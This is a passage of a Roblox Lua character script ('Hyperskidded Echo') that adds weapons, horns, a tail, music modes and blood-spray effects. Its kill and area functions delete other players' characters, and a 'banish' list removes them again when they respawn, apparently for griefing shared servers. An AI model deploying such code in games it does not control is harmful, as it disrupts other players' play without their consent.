						local BLOOD = CreatePart(3, Effects, "Glass", 0, 0, "Maroon", "BloodPuddle", VT(0.5,0.5,0.5),false)
						BLOOD.CFrame = CF(POSITION)
						MakeForm(BLOOD,"Ball")
						local bv = Instance.new("BodyVelocity",BLOOD) 
						bv.maxForce = Vector3.new(1e9, 1e9, 1e9)
						bv.velocity = CF(POSITION,DIRECTION+VT(MATHR(-3,3)/30,MATHR(-3,3)/30,MATHR(-3,3)/30)).lookVector*15
						bv.Name = "MOVE"
						Debris:AddItem(bv,0.05)
						coroutine.resume(coroutine.create(function()
							local HASTOUCHEDGROUND = false
							local HIT = BLOOD.Touched:Connect(function(hit)
								if hit.Anchored == true then
									HASTOUCHEDGROUND = true
									PuddleOfBlood(BLOOD.Position+VT(0,1,0),2,BLOOD,BloodSize)
								end
							end)
							for i = 1, 50 do
								Swait()
								if HASTOUCHEDGROUND == true then
									break
								end
								BLOOD.Size = BLOOD.Size * 0.9
							end
							BLOOD:remove()
						end))
					end

					function DESTROYAHAHAHAHAH(Target)
						if Target.Parent ~= Weapon and Target:FindFirstChildOfClass("Humanoid") then
							Target:BreakJoints()
							local CFRAME = Target:FindFirstChild("Torso").CFrame or Target:FindFirstChild("UpperTorso")
							local CLONE,TORS2,DummyHead = Ragdoll(Target,Torso)
							getbloody(DummyHead,45)
							if TORS2 ~= nil then
								CreateSound("185688060", TORS2, 10, (math.random(8,12)/10))
								CreateSound("337800380", DummyHead, 5, (math.random(8,18)/10))
								local HUM = IT("Humanoid")
								HUM.MaxHealth = 0
								HUM.Health = 0
								HUM.Name = "CorpseHumanoid"
								HUM.PlatformStand = true
								HUM.Parent = CLONE
								TORS2.CFrame = CFRAME
								coroutine.resume(coroutine.create(function()
									for i = 1, 450 do
										wait()
										SprayBlood(DummyHead.CFrame*CF(0,-0.25,0).p,DummyHead.CFrame*CF(0,-0.7,0).p,5)
										SprayBlood(TORS2.CFrame*CF(0,TORS2.Size.Y/2,0).p,TORS2.CFrame*CF(0,TORS2.Size.Y,0).p,10)
										--PuddleOfBlood(DummyHead.CFrame*CF(0,-0.25,0).p,4,CLONE,3)
										--PuddleOfBlood(TORS2.CFrame*CF(0,TORS2.Size.Y/2,0).p,8,CLONE,6)
									end
									CLONE:Remove()
								end))
							end
						end
					end

					local SayText = Instance.new("ScreenGui")
					SayText.Name = "CreditsAndAuthentication"
					SayText.ResetOnSpawn = false
					SayText.Parent = lplr:FindFirstChildOfClass("PlayerGui")
					local SayText2 = Instance.new("TextLabel",SayText)
					SayText2.BackgroundTransparency = 1
					SayText2.BorderSizePixel = 0
					SayText2.Text = "서버 터질 준비됐어? 그럼 비트 틀어!"
					SayText2.Font = "Code"
					SayText2.TextScaled = true
					SayText2.TextStrokeTransparency = 0
					coroutine.resume(coroutine.create(function()

					end))

					--//=================================\\
					--||	     WEAPON CREATION
					--\\=================================//

					local YCSI = script["DE#3989fd03ud"]["YCSI"]

					local GUN = script["DE#3989fd03ud"]["Model"]

					local cannon = script["DE#3989fd03ud"]["Cannon"]

					local Blade = YCSI:Clone()
					local Gunclone = GUN:Clone()
					local cannon = cannon:Clone()

					Blade.Parent = Character
					Gunclone.Parent = Character
					local BladeGrip = CreateWeldOrSnapOrMotor("Weld", Blade.Handle, RightArm, Blade.Handle, CF(0, -1, 0)*ANGLES(RAD(90),RAD(0),RAD(0)), CF(0, 0, 0))
					local gunGrip = CreateWeldOrSnapOrMotor("Weld", Gunclone.Handle, RightArm, Gunclone.Handle, CF(0,-1, 0) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0.21, 0))
					local CannonGrip = CreateWeldOrSnapOrMotor("Weld", cannon, RightArm, cannon, CF(.05,-1,-.15) * ANGLES(RAD(-90),RAD(0),RAD(0)),CF(0.05, -1, 2.2))
					--cannon.C0,CFrame.new(.05,-1,-.15) * CFrame.Angles(math.rad(-90),math.rad(0),math.rad(0)),1
					local BackBlade = YCSI:Clone()
					Blade.Parent = Character
					CreateWeldOrSnapOrMotor("Weld", BackBlade.REDB, Torso, BackBlade.REDB, CF(1, -0.5, 0.5)*ANGLES(RAD(0),RAD(0),RAD(-45)), CF(0, 0, 0))

					local WEAPONGUI = IT("ScreenGui")


					local SKILLTEXTCOLOR = Color3.fromRGB(100,0,0)
					local SKILLFONT = Enum.Font.Antique
					local SKILLTEXTSIZE = 7.5

					local ATTACKS = {""..SCRIPTVERSION.."","Q","E","T","J","K","L","Z","X","C","V","B"}
					local ATTACKSFRAME = CreateFrame(WEAPONGUI, 1, 2, UD2(0.8, 0, 0.90, 0), UD2(0.26, 0, 0.07, 0), C3(0,0,0), C3(0, 0, 0), "Skill Frame")
					local TEXT = CreateLabel(ATTACKSFRAME, "[BANISH]", SKILLTEXTCOLOR, SKILLTEXTSIZE+1, SKILLFONT, 0, 2, 0.5, "Skill text")

					for i = 1, #ATTACKS do
						local SKILLFRAME = CreateFrame(WEAPONGUI, 1, 2, UD2(0.8, 0, 0.90-(0.04*i), 0), UD2(0.26, 0, 0.07, 0), C3(0,0,0), C3(0, 0, 0), "Skill Frame")
						local SKILLTEXT = CreateLabel(SKILLFRAME, "["..ATTACKS[i].."]", SKILLTEXTCOLOR, SKILLTEXTSIZE, SKILLFONT, 0, 2, 0.5, "Skill text")
					end

					coroutine.wrap(function()
						while wait() do
							mtext2.TextColor3 = COLORSHIFT
							WEAPONGUI.Parent = PlayerGui
							cannon.Color = COLORSHIFT
							LWing.Color = COLORSHIFT
							RWing.Color = COLORSHIFT
							game:GetService("Lighting").ClockTime = 0
							for i,v in pairs(Gunclone:GetChildren()) do
								v.Color = COLORSHIFT
							end
							if MODE == 1 then
								TEXT.Text = "[Normal]"
								mtext2.Text = "Hyperskidded Echo"
								MusID.Value = "1296056458"
							elseif MODE == 2 then
								TEXT.Text = "[BloodWater]"
								mtext2.Text = "HSE - B l o o d W a t e r"
								MusID.Value = "4835535512"
							elseif MODE == 3 then
								TEXT.Text = "[Bad Apple]"
								mtext2.Text = "HSE - B a d  A p p l e"
								MusID.Value = "932923622"
							elseif MODE == 4 then
								TEXT.Text = "[Ultraskidded Echo]"
								mtext2.Text = "HSE - U l t r a s k i d d e d  E c h o"
								MusID.Value = "6144914219"
							elseif MODE == 5 then
								TEXT.Text = "[Error (USE)]"
								mtext2.Text = "HSE - E r r o r (USE)"
								MusID.Value = "2349318464"
							elseif MODE == 6 then
								TEXT.Text = "[Hyperskidded Cannon]"
								mtext2.Text = "HSE - H y p e r s k i d d e d  C a n n o n"
								MusID.Value = "5495430725"
							elseif MODE == 7 then
								TEXT.Text = "[SOLID LC]"
								mtext2.Text = "HSE - S O L I D  L C"
								MusID.Value = "348832364"
							elseif MODE == 8 then
								TEXT.Text = "[Err0r]"
								mtext2.Text = "HSE - E r r 0 r"
								MusID.Value = "859912308"
							elseif MODE == 9 then
								TEXT.Text = "[Purple guy]"
								mtext2.Text = "HSE - P u r p l e  g u y"
								MusID.Value = "5177243035"
							elseif MODE == 10 then
								TEXT.Text = "[Chilled]"
								mtext2.Text = "HSE - C h i l l e d"
								MusID.Value = "679355361"
							elseif MODE == 11 then
								TEXT.Text = "[Echo]"
								mtext2.Text = "HSE - E c h o"
								MusID.Value = "573736432"
							elseif MODE == 12 then
								TEXT.Text = "[SuperUBlockAlt]"
								mtext2.Text = "HSE - S u p e r U B l o c k A l t"
								MusID.Value = "2242814132"
							elseif MODE == 13 then
								TEXT.Text = "[Immortality Lord]"
								mtext2.Text = "HSE - I m m o r t a l i t y  L o r d"
								MusID.Value = "6049110238"
							elseif MODE == 14 then
								TEXT.Text = "[Lightning Cannon]"
								mtext2.Text = "HSE - L i g h t n i n g  C a n n o n"
								MusID.Value = "3247404955"
							elseif MODE == 15 then
								TEXT.Text = "[Kickisher Rewrite v4]"
								mtext2.Text = "HSE - K R e w r i t e V 4"
								MusID.Value = "143884682"
							elseif MODE == 16 then
								TEXT.Text = "[MAYHEM]"
								mtext2.Text = "HSE - M A Y H E M"
								MusID.Value = "614032233"
							elseif MODE == 17 then
								TEXT.Text = "[Death]"
								mtext2.Text = "HSE - D e a t h"
								MusID.Value = "1426355953"
							elseif MODE == 18 then
								TEXT.Text = "[Redemption]"
								mtext2.Text = "HSE - R e d e m p t i o n"
								MusID.Value = "1632083717"
							elseif MODE == 19 then
								TEXT.Text = "[SBV4 SCR]"
								mtext2.Text = "HSE - S B V 4  S C R"
								MusID.Value = "199531143"
							elseif MODE == 20 then
								TEXT.Text = "[Corrupt]"
								mtext2.Text = "HSE - C o r r u p t"
								MusID.Value = "151915559"
							elseif MODE == 21 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							elseif MODE == 22 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							elseif MODE == 23 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							elseif MODE == 24 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							elseif MODE == 25 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							elseif MODE == 26 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							elseif MODE == 27 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							elseif MODE == 28 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							elseif MODE == 29 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							elseif MODE == 30 then
								TEXT.Text = "[]"
								mtext2.Text = "HSE - "
								MusID.Value = ""
							end
							Sick.SoundId = "rbxassetid://"..MusID.Value
							Sick.Volume = SongVol.Value
						end
					end)()


					local CreationFolder = IT("Folder",Character)
					CreationFolder.Name = "CreationFolder"

					local LASTPART2 = Head--Extra Horns 1
					for i = 1, 36 do
						local MATH = (1-(i/25))
						if LASTPART2 == Head then
							local Horn2 = CreatePart(3, Character, "Neon", 0, 0, "Really black", "Horn2", VT(0.25*MATH,0.25,0.25*MATH),false)
							CreateWeldOrSnapOrMotor("Weld", LASTPART2, LASTPART2, Horn2, CF(0.3, 0.7, -0.35) * ANGLES(RAD(-55), RAD(15), RAD(-15)), CF(0, 0, 0))
							LASTPART2 = Horn2
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Horn2.Color = COLORSHIFT
								end
							end))
						else
							local Horn2 = CreatePart(3, Character, "Neon", 0, 0, "Really black", "Horn2", VT(0.25*MATH,0.25,0.25*MATH),false)
							CreateWeldOrSnapOrMotor("Weld", LASTPART2, LASTPART2, Horn2, CF(0, Horn2.Size.Y/1.8, 0) * ANGLES(RAD(6), RAD(-0.3), RAD(0)), CF(0, 0, 0))
							LASTPART2 = Horn2
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Horn2.Color = COLORSHIFT
								end
							end))
						end
					end--
					local LASTPART2 = Head--Extra Horns 2
					for i = 1, 36 do
						local MATH = (1-(i/25))
						if LASTPART2 == Head then
							local Horn2 = CreatePart(3, Character, "Neon", 0, 0, "Really black", "Horn2", VT(0.25*MATH,0.25,0.25*MATH),false)
							CreateWeldOrSnapOrMotor("Weld", LASTPART2, LASTPART2, Horn2, CF(-0.3, 0.7, -0.35) * ANGLES(RAD(-55), RAD(-15), RAD(15)), CF(0, 0, 0))
							LASTPART2 = Horn2
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Horn2.Color = COLORSHIFT
								end
							end))
						else
							local Horn2 = CreatePart(3, Character, "Neon", 0, 0, "Really black", "Horn2", VT(0.25*MATH,0.25,0.25*MATH),false)
							CreateWeldOrSnapOrMotor("Weld", LASTPART2, LASTPART2, Horn2, CF(0, Horn2.Size.Y/1.8, 0) * ANGLES(RAD(6), RAD(0.3), RAD(0)), CF(0, 0, 0))
							LASTPART2 = Horn2
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Horn2.Color = COLORSHIFT
								end
							end))
						end
					end

					local LASTPART = Head
					for i = 1, 62 do
						local MATH = (1-(i/25))
						if LASTPART == Head then
							local Horn = CreatePart(3, Character, "Neon", 0, 0, "Dirt brown", "Horn", VT(0.25*MATH,0.25,0.25*MATH),false)
							CreateWeldOrSnapOrMotor("Weld", LASTPART, LASTPART, Horn, CF(0.3, 0.7, -0.35) * ANGLES(RAD(-55), RAD(15), RAD(-15)), CF(0, 0, 0))
							LASTPART = Horn
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Horn.Color = COLORSHIFT
								end
							end))
						else
							local Horn = CreatePart(3, Character, "Neon", 0, 0, "Dirt brown", "Horn", VT(0.25*MATH,0.25,0.25*MATH),false)
							CreateWeldOrSnapOrMotor("Weld", LASTPART, LASTPART, Horn, CF(0, Horn.Size.Y/1.8, 0) * ANGLES(RAD(6), RAD(-2.5), RAD(0)), CF(0, 0, 0))
							LASTPART = Horn
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Horn.Color = COLORSHIFT
								end
							end))
						end
					end
					local LASTPART = Head
					for i = 1, 62 do
						local MATH = (1-(i/25))
						if LASTPART == Head then
							local Horn = CreatePart(3, Character, "Neon", 0, 0, "Dirt brown", "Horn", VT(0.25*MATH,0.25,0.25*MATH),false)
							CreateWeldOrSnapOrMotor("Weld", LASTPART, LASTPART, Horn, CF(-0.3, 0.7, -0.35) * ANGLES(RAD(-55), RAD(-15), RAD(15)), CF(0, 0, 0))
							LASTPART = Horn
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Horn.Color = COLORSHIFT
								end
							end))
						else
							local Horn = CreatePart(3, Character, Enum.Material.Neon, 0, 0, "Dirt brown", "Horn", VT(0.25*MATH,0.25,0.25*MATH),false)
							CreateWeldOrSnapOrMotor("Weld", LASTPART, LASTPART, Horn, CF(0, Horn.Size.Y/1.8, 0) * ANGLES(RAD(6), RAD(2.5), RAD(0)), CF(0, 0, 0))
							LASTPART = Horn
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Horn.Color = COLORSHIFT
								end
							end))
						end
					end
					local LASTPART = Torso
					for i = 1, 75 do
						local MATH = 1 - i / 70
						if LASTPART == Torso then
							local Tail = CreatePart(3, Character, Enum.Material.Neon, 0, 0, "New Yeller", "Tail", VT(0.25 * MATH, 0.25, 0.25 * MATH), false)
							local WLD = CreateWeldOrSnapOrMotor("Weld", LASTPART, LASTPART, Tail, CF(0, -0.75, 0.5) * ANGLES(RAD(90), RAD(0), RAD(0)), CF(0, 0, 0))
							LASTPART = Tail
							Tail.Color = C3((i*3-3)/.5,0,.5)
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Tail.Color = COLORSHIFT
								end
							end))
							table.insert(TAIL, WLD)
						else
							local Tail = CreatePart(3, Character, Enum.Material.Neon, 0, 0, "New Yeller", "Tail", VT(0.25 * MATH, 0.25, 0.25 * MATH), false)
							local WLD = CreateWeldOrSnapOrMotor("Weld", LASTPART, LASTPART, Tail, CF(0, Tail.Size.Y / 2, 0) * ANGLES(RAD(-1.2), RAD(0), RAD(0)), CF(0, 0, 0))
							LASTPART = Tail
							Tail.Color = C3((i*3-3)/.5,0,.5)
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									Tail.Color = COLORSHIFT
								end
							end))
							table.insert(TAIL, WLD)
						end
					end


					Humanoid:SetStateEnabled("Dead",false)
					Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,false)

					Humanoid:SetStateEnabled("GettingUp",true)
					Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
					Humanoid:SetStateEnabled("Ragdoll",false)
					Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)

					local PlayerSize = 1
					local FT,FRA,FLA,FRL,FLL = Instance.new("SpecialMesh"),Instance.new("SpecialMesh"),Instance.new("SpecialMesh"),Instance.new("SpecialMesh"),Instance.new("SpecialMesh")
					FT.MeshId,FT.Scale = "rbxasset://fonts/torso.mesh",Vector3.new(PlayerSize,PlayerSize,PlayerSize)
					FRA.MeshId,FRA.Scale = "rbxasset://fonts/rightarm.mesh",Vector3.new(PlayerSize,PlayerSize,PlayerSize)
					FLA.MeshId,FLA.Scale = "rbxasset://fonts/leftarm.mesh",Vector3.new(PlayerSize,PlayerSize,PlayerSize)
					FRL.MeshId,FRL.Scale = "rbxasset://fonts/rightleg.mesh",Vector3.new(PlayerSize,PlayerSize,PlayerSize)
					FLL.MeshId,FLL.Scale = "rbxasset://fonts/leftleg.mesh",Vector3.new(PlayerSize,PlayerSize,PlayerSize)

					game:GetService("Workspace").ChildAdded:connect(function(instance)
						for BANISH = 1, #TOBANISH do
							if TOBANISH[BANISH] ~= nil then
								if instance.Name == TOBANISH[BANISH] then
									coroutine.resume(coroutine.create(function()
										instance:ClearAllChildren()
										Debris:AddItem(instance,0.0005)
									end))
								end
							end
						end
					end)

					--//=================================\\
					--||			DAMAGING
					--\\=================================//

					function Kill(MODEL)
						local HUM = MODEL:FindFirstChildOfClass("Humanoid")
						MODEL:BreakJoints()
						if MODE == 1 then
							coroutine.resume(coroutine.create(function()
								table.insert(TOBANISH,MODEL.Name)	
							end))		
						end
						if HUM then
							for index, CHILD in pairs(MODEL:GetChildren()) do
								if CHILD:IsA("BasePart") then
									if CHILD.Name == "Head" then
										WACKYEFFECT2({Time = MATHR(10,30)*5, EffectType = "Box", Size = VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/3, Size2 = (VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/3)*MATHR(7,14)/10, Transparency = 0.5, Transparency2 = 1, CFrame = CHILD.CFrame, MoveToPos = CHILD.Position+VT(0,MATHR(5,8)/1.5,0), RotationX = MATHR(-25,25)/35, RotationY = MATHR(-25,25)/35, RotationZ = MATHR(-25,25)/35, Material = "Granite", Color = C3(.75,0,0), SoundID = nil, SoundPitch = .8, SoundVolume = 4, UseBoomerangMath = true, Boomerang = 100, SizeBoomerang = 3})
										WACKYEFFECT2({Time = MATHR(10,30)*5, EffectType = "Box", Size = VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/2, Size2 = (VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/2)*MATHR(7,14)/10, Transparency = 0.5, Transparency2 = 1, CFrame = CHILD.CFrame, MoveToPos = CHILD.Position+VT(0,MATHR(5,8)/1.5,0), RotationX = MATHR(-25,25)/35, RotationY = MATHR(-25,25)/35, RotationZ = MATHR(-25,25)/35, Material = "Granite", Color = C3(.5,0,0), SoundID = nil, SoundPitch = .7, SoundVolume = 6, UseBoomerangMath = true, Boomerang = 100, SizeBoomerang = 3})
										WACKYEFFECT2({Time = MATHR(10,30)*12, EffectType = "Box", Size = VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z), Size2 = VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z), Transparency = CHILD.Transparency, Transparency2 = 1, CFrame = CHILD.CFrame, MoveToPos = CHILD.Position+VT(MATHR(-360,360)/1.5,MATHR(-360,360)/1.5,0), MATHR(-360,360)/35, RotationX = MATHR(-360,360)/35, RotationY = MATHR(-360,360)/35, RotationZ = MATHR(-360,360)/35, Material = "Granite", Color = C3(.35,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil, UseBoomerangMath = true, SizeBoomerang = 0, Boomerang = 50})
									elseif CHILD.Name ~= "HumanoidRootPart" then
										WACKYEFFECT2({Time = MATHR(10,30)*5, EffectType = "Box", Size = VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/3, Size2 = (VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/3)*MATHR(7,14)/10, Transparency = 0.5, Transparency2 = 1, CFrame = CHILD.CFrame, MoveToPos = CHILD.Position+VT(0,MATHR(5,8)/1.5,0), RotationX = MATHR(-25,25)/35, RotationY = MATHR(-25,25)/35, RotationZ = MATHR(-25,25)/35, Material = "Granite", Color = C3(.75,0,0), SoundID = nil, SoundPitch = .8, SoundVolume = 4, UseBoomerangMath = true, Boomerang = 100, SizeBoomerang = 3})
										WACKYEFFECT2({Time = MATHR(10,30)*5, EffectType = "Box", Size = VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/2, Size2 = (VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/2)*MATHR(7,14)/10, Transparency = 0.5, Transparency2 = 1, CFrame = CHILD.CFrame, MoveToPos = CHILD.Position+VT(0,MATHR(5,8)/1.5,0), RotationX = MATHR(-25,25)/35, RotationY = MATHR(-25,25)/35, RotationZ = MATHR(-25,25)/35, Material = "Granite", Color = C3(.5,0,0), SoundID = nil, SoundPitch = .7, SoundVolume = 6, UseBoomerangMath = true, Boomerang = 100, SizeBoomerang = 3})
										WACKYEFFECT2({Time = MATHR(10,30)*6, EffectType = "Box", Size = CHILD.Size, Size2 = CHILD.Size, Transparency = CHILD.Transparency, Transparency2 = 1, CFrame = CHILD.CFrame, MoveToPos = CHILD.Position+VT(MATHR(-50,100)/1.5,MATHR(-50,100)/35,MATHR(-50,100)/35), MATHR(-50,100)/35, RotationX = MATHR(-50,100)/35, RotationY = MATHR(-50,100)/35, RotationZ = MATHR(-50,100)/35, Material = "Granite", Color = C3(.35,0,0), SoundID = nil, SoundPitch = .7, SoundVolume = 6, UseBoomerangMath = true, SizeBoomerang = 100, Boomerang = 35})
									end
									if CHILD.Name == "Torso" or CHILD.Name == "UpperTorso" then
										WACKYEFFECT2({Time = MATHR(10,30)*5, EffectType = "Box", Size = VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/3, Size2 = (VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/3)*MATHR(7,14)/10, Transparency = 0.5, Transparency2 = 1, CFrame = CHILD.CFrame, MoveToPos = CHILD.Position+VT(0,MATHR(5,8)/1.5,0), RotationX = MATHR(-25,25)/35, RotationY = MATHR(-25,25)/35, RotationZ = MATHR(-25,25)/35, Material = "Granite", Color = C3(.75,0,0), SoundID = 130113415, SoundPitch = MATHR(0.9,1.1), SoundVolume = 10, UseBoomerangMath = true, Boomerang = 100, SizeBoomerang = 3})
										WACKYEFFECT2({Time = MATHR(10,30)*5, EffectType = "Box", Size = VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/2, Size2 = (VT(CHILD.Size.Z,CHILD.Size.Y,CHILD.Size.Z)/2)*MATHR(7,14)/10, Transparency = 0.5, Transparency2 = 1, CFrame = CHILD.CFrame, MoveToPos = CHILD.Position+VT(0,MATHR(5,8)/1.5,0), RotationX = MATHR(-25,25)/35, RotationY = MATHR(-25,25)/35, RotationZ = MATHR(-25,25)/35, Material = "Granite", Color = C3(.5,0,0), SoundID = nil, SoundPitch = .7, SoundVolume = 6, UseBoomerangMath = true, Boomerang = 100, SizeBoomerang = 3})
										WACKYEFFECT2({Time = 50, EffectType = "Box", Size = VT(0.2,0.2,0.2)*CHILD.Size.Magnitude * 3, Size2 = VT(5,5,5)*CHILD.Size.Magnitude, Transparency = 0.8, Transparency2 = 1, CFrame = CF(CHILD.Position), MoveToPos = CHILD.Position+VT(MATHR(-50,100)/35,MATHR(-50,100)/35,MATHR(-50,100)/35), MATHR(-50,100)/35, RotationX = MATHR(-50,100)/35, RotationY = MATHR(-50,100)/35, RotationZ = MATHR(-50,100)/35, Material = "Granite", Color = C3(.35,0,0), SoundID = nil, SoundPitch = .7, SoundVolume = 6, UseBoomerangMath = true, Boomerang = 100, SizeBoomerang = 35})
									end
									CHILD:Destroy()
									CHILD:Destroy()
									CHILD:Destroy()
								end
							end
							HUM.Health = 0
						end
						MODEL:remove()
						MODEL:remove()
						MODEL:remove()
						MODEL:remove()
						MODEL:remove()
						MODEL:Destroy()
						MODEL:Destroy()
						MODEL:Destroy()
						MODEL:Destroy()
						MODEL:Destroy()
					end
					function MeshPartKill(MESHPART)
						WACKYEFFECT({Time = MATHR(10,30)*5, EffectType = "Box", Size = VT(MESHPART.Size.Z,MESHPART.Size.Y,MESHPART.Size.Z)/3, Size2 = (VT(MESHPART.Size.Z,MESHPART.Size.Y,MESHPART.Size.Z)/3)*MATHR(7,14)/10, Transparency = 0.5, Transparency2 = 1, CFrame = MESHPART.CFrame, MoveToPos = MESHPART.Position+VT(0,MATHR(5,8)/1.5,0), RotationX = MATHR(-25,25)/35, RotationY = MATHR(-25,25)/35, RotationZ = MATHR(-25,25)/35, Material = "Neon", Color = C3(0,0,0), SoundID = nil, SoundPitch = .8, SoundVolume = 4, UseBoomerangMath = true, Boomerang = 100, SizeBoomerang = 3})
						WACKYEFFECT({Time = MATHR(10,30)*5, EffectType = "Box", Size = VT(MESHPART.Size.Z,MESHPART.Size.Y,MESHPART.Size.Z)/2, Size2 = (VT(MESHPART.Size.Z,MESHPART.Size.Y,MESHPART.Size.Z)/2)*MATHR(7,14)/10, Transparency = 0.5, Transparency2 = 1, CFrame = MESHPART.CFrame, MoveToPos = MESHPART.Position+VT(0,MATHR(5,8)/1.5,0), RotationX = MATHR(-25,25)/35, RotationY = MATHR(-25,25)/35, RotationZ = MATHR(-25,25)/35, Material = "Neon", Color = C3(0,0,0), SoundID = nil, SoundPitch = .7, SoundVolume = 6, UseBoomerangMath = true, Boomerang = 100, SizeBoomerang = 3})
						WACKYEFFECT({Time = MATHR(10,30)*6, EffectType = "Box", Size = MESHPART.Size, Size2 = MESHPART.Size, Transparency = MESHPART.Transparency, Transparency2 = 1, CFrame = MESHPART.CFrame, MoveToPos = MESHPART.Position+VT(MATHR(-50,100)/1.5,MATHR(-50,100)/35,MATHR(-50,100)/35), MATHR(-50,100)/35, RotationX = MATHR(-50,100)/35, RotationY = MATHR(-50,100)/35, RotationZ = MATHR(-50,100)/35, Material = "Neon", Color = C3(0,0,0), SoundID = nil, SoundPitch = .7, SoundVolume = 6, UseBoomerangMath = true, SizeBoomerang = 100, Boomerang = 35})
						MESHPART:remove()
						MESHPART:remove()
						MESHPART:remove()
						MESHPART:remove()
						MESHPART:remove()
						MESHPART:Destroy()
						MESHPART:Destroy()
						MESHPART:Destroy()
						MESHPART:Destroy()
						MESHPART:Destroy()
					end
					function ApplyAoE(POSITION,RANGE)
						for index, CHILD in pairs(game:GetService("Workspace"):GetDescendants()) do
							if CHILD.ClassName == "Model" and CHILD ~= Character then
								local HUM = CHILD:FindFirstChildOfClass("Humanoid")
								if HUM then
									local TORSO = CHILD:FindFirstChild("Torso") or CHILD:FindFirstChild("UpperTorso")
									if TORSO then
										if (TORSO.Position - POSITION).Magnitude <= RANGE then
											Kill(CHILD)
										end
									end
								end
							end
						end
					end

					--//=================================\\
					--||      ANTI-DEATH CREATION
					--\\=================================//

					function antideath()
						Head.Parent = Character
						Torso.Parent = Character
						RightArm.Parent = Character
						LeftArm.Parent = Character
						LeftLeg.Parent = Character
						RightLeg.Parent = Character
						Head.Transparency = 0
						Torso.Transparency = 0
						RightArm.Transparency = 0
						LeftArm.Transparency = 0
						LeftLeg.Transparency = 0
						RightLeg.Transparency = 0
						RootPart.Transparency = 1
						Head.Locked = true
						Torso.Locked = true
						RightArm.Locked = true
						LeftArm.Locked = true
						LeftLeg.Locked = true
						RightLeg.Locked = true
						Shield.Locked = true
						Humanoid.Parent = Character
					end

					local Regen = {}
					delay(1,function()
						local Descendants = Character:GetDescendants()
						for i = 1,#Descendants do
							local E = Descendants[i]
							if E:IsA("BasePart") and not E:IsDescendantOf(Effects) then
								E.CustomPhysicalProperties = PhysicalProperties.new(Enum.Material.Wood)
								table.insert(Regen,{E,E.Parent,E.Color,E.Size,E.Material})
							end
							if E:IsA("JointInstance") then
								table.insert(Regen,{E,E.Parent,nil,nil,nil})
							end
						end
					end)

					local BODY = {}

					for e = 1, #BODY do
						if BODY[e] ~= nil then
							local STUFF = BODY[e]
							local PART = STUFF[1]
							local PARENT = STUFF[2]
							local MATERIAL = STUFF[3]
							local COLOR = STUFF[4]
							local TRANSPARENCY = STUFF[5]
							if PART.ClassName == "Part" and PART ~= RootPart then
								PART.Material = MATERIAL
								PART.Color = COLOR
								PART.Transparency = TRANSPARENCY
							end
							PART.AncestryChanged:Connect(function()
								PART.Parent = PARENT
							end)
						end
					end


					function Refit2()
						Character.Parent = game:GetService("Workspace")
						Effects.Parent = Character
						CreationFolder.Parent = Character
						for e = 1, #BODY do
							if BODY[e] ~= nil then
								local STUFF = BODY[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								--local SIZE = STUFF[6]
								local NAME = STUFF[7]
								if PART.ClassName == "Part" and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Transparency = TRANSPARENCY
									PART.Name = NAME
								end
								if PART.Parent ~= PARENT then
									if PART.Name == "Head" or PART.Name == "Neck" or PART.Name == "Torso" then
										Humanoid:remove()
									end
									PART.Parent = PARENT
									if PART.Name == "Head" or PART.Name == "Neck" or PART.Name == "Torso" then
										Humanoid = IT("Humanoid",Character)
									end
								end
							end
						end
					end

					local BODY2 = {}
					for e = 1, #BODY2 do
						if BODY2[e] ~= nil then
							do
								local STUFF = BODY2[e]
								local PART = STUFF[1]
								local PARENT = STUFF[2]
								local MATERIAL = STUFF[3]
								local COLOR = STUFF[4]
								local TRANSPARENCY = STUFF[5]
								if PART.ClassName == "Part" and PART ~= RootPart then
									PART.Material = MATERIAL
									PART.Color = COLOR
									PART.Transparency = TRANSPARENCY
								end
								PART.AncestryChanged:Connect(function()
									PART.Parent = PARENT
								end)
							end
						end
					end
					function Refit3()
						Character.Parent = game:GetService("Workspace")
						for e = 1, #BODY2 do
							if BODY2[e] ~= nil then
								local STUFF = BODY2[e]
								local PART = STUFF[1]
